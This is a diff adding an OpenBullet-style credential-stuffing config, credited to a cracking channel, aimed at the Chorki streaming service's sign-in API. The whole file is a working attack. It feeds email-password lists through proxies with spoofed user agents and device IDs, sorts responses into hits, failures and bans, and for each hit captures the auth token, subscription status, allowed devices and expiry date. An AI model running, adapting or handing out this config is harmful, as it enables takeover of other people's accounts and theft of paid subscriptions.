@@ -1,0 +1,113 @@
+[SETTINGS]
+{
+  "Name": "Chorki",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-12-06T21:23:27.3609238+05:30",
+  "AdditionalInfo": "Join @CrackerzHub || Network --> @z3ro23",
+  "Author": "- DoMiNiC -",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#UA FUNCTION GetRandomUA -> VAR "UA" 
+
+#ID FUNCTION GenerateGUID -> VAR "ID" 
+
+#REQ(POST) REQUEST POST "https://prod-api.viewlift.com/identity/signin?site=prothomalo&deviceId=browser-<ID>" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "authority: prod-api.viewlift.com" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-language: en-US,en;q=0.9,hi;q=0.8" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "origin: https://www.chorki.com" 
+  HEADER "referer: https://www.chorki.com/" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: <UA>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "EMAIL_NOT_REGISTERED" 
+    KEY "EMAIL_OR_PASSWORD_INCORRECT" 
+  KEYCHAIN Ban OR 
+    KEY "Unauthorized" 
+  KEYCHAIN Success OR 
+    KEY "authorizationToken" 
+
+#1 PARSE "<SOURCE>" JSON "authorizationToken" -> VAR "1" 
+
+#Subscribed PARSE "<SOURCE>" JSON "isSubscribed" CreateEmpty=FALSE -> CAP "Subscribed" 
+
+#REQ(INFO) REQUEST GET "https://prod-api.viewlift.com/identity/user?site=prothomalo" 
+  
+  HEADER "authority: prod-api.viewlift.com" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-language: en-US,en;q=0.9,hi;q=0.8" 
+  HEADER "authorization: <1>" 
+  HEADER "origin: https://www.chorki.com" 
+  HEADER "referer: https://www.chorki.com/" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: <UA>" 
+
+#Allowed PARSE "<SOURCE>" JSON "numberOfAllowedDevices" CreateEmpty=FALSE -> CAP "Allowed" "" " Devices" 
+
+#Expiry_Date PARSE "<SOURCE>" LR "subscriptionEndDate\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry Date" 
+
+#2 PARSE "<SOURCE>" JSON "userState" -> VAR "2" 
+
+#State FUNCTION Base64Decode "<2>" -> VAR "State" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<State>" Contains "{\"state\":[\"subscribed\"]" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<State>" DoesNotContain "{\"state\":[\"subscribed\"]" 
+
+#Credits FUNCTION Constant "@XxDoMiNiCxX 🔥" -> CAP "Config By" 
+
